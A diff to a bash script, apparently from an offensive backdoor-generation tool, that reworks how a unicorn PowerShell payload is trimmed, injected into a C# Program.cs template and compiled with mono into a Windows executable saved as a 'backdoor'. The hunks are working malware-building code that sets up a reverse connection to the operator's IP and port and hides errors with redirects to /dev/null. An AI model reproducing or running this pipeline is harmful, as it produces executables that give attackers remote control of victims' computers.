@@ -1950,7 +1950,7 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport 
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
 power=$path/powershell_attack.txt
@@ -1963,24 +1963,42 @@ read -rsp $'Press any key to return to return to menu\n' -n 1 key
 clear
 PwnWinds
 fi
-					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
-					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
-					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
-					s3=$(cat powershell_attack.txt | cut -d ' ' -f4)
-					s4=$(cat powershell_attack.txt | cut -d ' ' -f5)
-
-					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $B > $bcom
-					echo
+					#Removing first 20 characters and last from payload
+                                        cuts=$(sed -r 's/^.{20}//' powershell_attack.txt) 
+                                        echo $cuts > output/cuts.tmp
+ 
+#Removing last character of payload   
+                                        cuts1=$(sed '1 s/.$//' output/cuts.tmp)
+                                        echo $cuts1 > output/cuts1.tmp              
+                                        cp $B $path/output/Program.cs
+                                        tgt=$path/output/Program.cs
+                                        pld=$(cat output/cuts1.tmp)
+                                        
+#Inserting Payload into Program.cs file
+                                        sed -i "s/PAYLOAD/$pld/g" $tgt
+                                        
 powerf=$path/output/Program.cs
-                                        if [ ! -f "$powerf" ]
+size=7
+actualsize=$(du -k "$powerf" | cut -f 1)
+                                        if [ $actualsize -ge $size ]
                                         then
-                                        echo -e $red ""
-                                        echo "Unable to find the output $power"
                                         echo -e $okegreen ""
+else 
+echo -e $red ""
+echo "There was a problem inserting the payload into final file to be compiled
+at $powerf "
+echo ""
+                                        rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
+                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
+                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
 read -rsp $'Press any key to return to return to menu\n' -n 1 key
 clear
 PwnWinds
 fi
+                                        echo -e $okegreen ""
+
+
+
 					dmcs $bcom -o "output/$fira.exe" > /dev/null 2>&1
 power=$path/output/$fira.exe
                                         if [ ! -f "$power" ]
@@ -1988,16 +2006,23 @@ power=$path/output/$fira.exe
                                         echo -e $red ""
                                         echo "Unable to compile with mono $powerf into $power"
                                         echo -e $okegreen ""
+                                        rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
+                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
+                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
 read -rsp $'Press any key to return to return to menu\n' -n 1 key
 clear
 PwnWinds
 fi
-					rm unicorn.rc powershell_attack.txt $bcom
+					rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
+                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
+                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
 					sleep 2
 					echo ""
 					echo -e $okegreen""
 					echo -e "Backdoor Saved To output Folder "
-
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
 
 
 				elif test $fatrat1 == '3' #Apachecompler
@@ -2051,7 +2076,8 @@ fi
 					sleep 2
 					echo ""
 					echo -e $okegreen""
-					echo -e "  Backdoor Saved To output Folder "
+                                        rm -rf $path/output/Program.cs >/dev/null 2>&1
+                                    	echo -e $okegreen "  Backdoor Saved To output Folder "
 					echo ""
 					echo -ne "  Press any key to continue ......... "
 					read continue
